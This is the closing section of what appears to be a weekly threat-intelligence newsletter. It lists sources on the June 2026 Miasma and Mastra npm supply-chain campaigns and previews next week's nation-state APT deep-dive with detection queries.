- [Preinstall to Persistence: Inside the Red Hat npm Miasma Credential-Stealing Campaign](https://www.microsoft.com/en-us/security/blog/2026/06/02/preinstall-persistence-inside-red-hat-npm-miasma-credential-stealing-campaign/) — Microsoft Defender Security Research, June 3, 2026. Broader <span class="glossary-term" data-bs-toggle="tooltip" title="The June 2026 npm supply-chain campaign that compromised 32 @redhat-cloud-services packages via the RedHatInsights GitHub Actions OIDC trusted publisher. Self-propagating worm; payload runs under Bun.">Miasma</span> campaign context and worm propagation mechanics.
- [Mastra npm Supply Chain Attack: 140+ Packages Backdoored via easy-day-js Typosquat](https://www.stepsecurity.io/blog/mastra-npm-packages-compromised-using-easy-day-js) — StepSecurity, June 17, 2026. Third attack surface (npm ecosystem) hit the same week, attributed to Sapphire Sleet (North Korea), underscoring the concurrent multi-vector developer workstation campaign.
- [North Korean Hackers Blamed for Mastra NPM Supply Chain Attack](https://www.securityweek.com/north-korean-hackers-blamed-for-mastra-npm-supply-chain-attack/) — SecurityWeek, June 2026. Attribution context for the Mastra campaign's relationship to the broader June 2026 wave.

---

*Next week (rotation: Cloud → Supply-Chain → <span class="glossary-term" data-bs-toggle="tooltip" title="Advanced Persistent Threat, a stealthy threat actor, typically a nation state or state-sponsored group, which gains unauthorized access to a computer network and remains undetected for an extended period.">APT</span> → Threat-Intel): <span class="glossary-term" data-bs-toggle="tooltip" title="Advanced Persistent Threat, a stealthy threat actor, typically a nation state or state-sponsored group, which gains unauthorized access to a computer network and remains undetected for an extended period.">APT</span> deep-dive — we'll track a newly attributed nation-state campaign with concrete <span class="glossary-term" data-bs-toggle="tooltip" title="Tactics, Techniques, and Procedures, the behavior of a threat actor. A tactic is the highest-level description of this behavior, while techniques give a more detailed description of behavior in the context of a tactic, and procedures an even lower-level, highly detailed description in the context of a technique.">TTPs</span>, victim telemetry, and Sigma/<span class="glossary-term" data-bs-toggle="tooltip" title="Kusto Query Language. The query language used by Microsoft Sentinel, Azure Log Analytics, and Defender for hunting and detection across telemetry.">KQL</span> detections.*
